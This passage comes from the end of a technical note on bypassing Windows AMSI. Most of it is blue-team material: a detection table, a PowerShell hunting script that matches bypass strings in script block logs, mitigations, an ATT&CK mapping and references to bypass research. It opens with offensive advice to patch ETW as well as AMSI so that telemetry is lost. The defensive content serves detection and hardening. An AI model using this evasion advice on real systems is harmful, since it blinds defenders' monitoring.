- **ETW is independent of AMSI.** A working AMSI bypass with ETW intact still generates telemetry that can be correlated post-incident. Always patch both.

---

## Detection (Blue Team)

| signal | event |
|--------|-------|
| Reflection bypass strings in script | EID 4104 — ScriptBlock: `amsiInitFailed`, `AmsiUtils`, `amsiContext` |
| `VirtualProtect` called on `amsi.dll` address range | ETW — `Microsoft-Windows-Kernel-Audit-API-Calls` |
| `amsi.dll` bytes modified in process memory | Periodic memory scan — Defender, EDR |
| PS2 process spawned | Sysmon EID 1 — `powershell.exe -version 2` |
| ETW provider disabled or patched | ETW session audit log |
| Unsigned assembly loaded into PowerShell | EID 7 — Sysmon ImageLoad |
| AMSI scan result override detected | Defender EID 1116 |

**PowerShell Script Block Logging detection rule (EID 4104):**

```powershell
# Hunt-AMSIBypass.ps1 — search SBL for bypass indicators
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'
    Id      = 4104
} | Where-Object {
    $_.Message -match 'amsiInitFailed|amsiContext|AmsiUtils|AmsiScanBuffer|amsi\.dll'
} | Select-Object TimeCreated, Message | Format-List
```

**Mitigation stack:**

```
AMSI + ETW monitoring          — baseline visibility
Script Block Logging (EID 4104) — captures bypass attempts pre-execution
Process memory integrity (EDR)  — catches byte patches at runtime
Constrained Language Mode       — limits reflection access
WDAC                            — blocks unsigned assemblies entirely
Remove PowerShell v2 feature    — closes downgrade vector
```

```powershell
# Remove PowerShell v2 (mitigation)
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart
```

---

## MITRE ATT&CK

| technique | ID | description |
|-----------|----|-------------|
| Impair Defenses: Disable or Modify Tools | T1562.001 | Patching AMSI / ETW |
| Command and Scripting: PowerShell | T1059.001 | PS-based bypass delivery |
| Reflective Code Loading | T1620 | Assembly.Load() post-bypass |
| Obfuscated Files or Information | T1027 | Bypass string obfuscation |
| Defense Evasion | TA0005 | Primary tactic |

---

## References

- [MITRE ATT&CK T1562.001](https://attack.mitre.org/techniques/T1562/001/)
- Matt Graeber — original AMSI bypass research (2016)
- [Microsoft AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- Daniel Duggan (RastaMouse) — context corruption technique
- [S3cur3Th1sSh1t — AMSI bypass collection](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [BC Security — hardware breakpoint bypass research](https://bc-security.org)
- itm4n — ETW bypass and analysis
- [LOLBAS Project](https://lolbas-project.github.io/)
